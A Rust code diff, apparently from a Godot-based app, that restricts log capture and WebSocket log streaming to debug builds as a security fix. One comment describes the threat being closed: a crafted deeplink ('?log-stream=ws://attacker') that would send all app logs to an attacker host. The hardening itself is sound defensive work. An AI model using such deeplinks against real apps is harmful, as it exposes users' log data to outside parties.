@@ -284,13 +284,16 @@ impl INode for DclGlobal {
     fn init(base: Base<Node>) -> Self {
         // Install stdout/stderr log capture as early as possible when --log-stream
         // is set, so boot logs are retained in the ring buffer before the client
-        // connects. Cheap and tokio-free; the WebSocket client is started later
-        // from GDScript via `start_log_stream` (see explorer.gd / deep_link_router).
-        if crate::tools::godot_logger::find_arg_value(
-            &crate::tools::godot_logger::get_godot_args(),
-            "--log-stream",
-        )
-        .is_some()
+        // connects. DEV-ONLY: gated to debug builds, so release/TestFlight/App Store
+        // never installs the capturing logger or the fd redirect (see also
+        // `start_log_stream`). Cheap and tokio-free; the WebSocket client is started
+        // later from GDScript via `start_log_stream` (explorer.gd / deep_link_router).
+        if godot::classes::Os::singleton().is_debug_build()
+            && crate::tools::godot_logger::find_arg_value(
+                &crate::tools::godot_logger::get_godot_args(),
+                "--log-stream",
+            )
+            .is_some()
         {
             crate::tools::log_stream::install_capture();
         }
@@ -762,6 +765,15 @@ impl DclGlobal {
     /// when `--log-stream` / `?log-stream=` is set. Safe to call repeatedly.
     #[func]
     pub fn start_log_stream(url: GString) {
+        // DEV-ONLY: never activate on release/TestFlight/App Store builds. Without
+        // this gate a crafted deeplink (`?log-stream=ws://attacker`) would stream all
+        // app logs out to an arbitrary host in production. Mirrors the debug gate on
+        // the dev localhost relay (godot/src/tool/dev_localhost_relay.gd). Uses a
+        // plain print (not warn/error) so it never reaches Sentry.
+        if !godot::classes::Os::singleton().is_debug_build() {
+            godot_print!("[log-stream] ignored: not a debug build");
+            return;
+        }
         let url = url.to_string();
         if url.is_empty() {
             return;
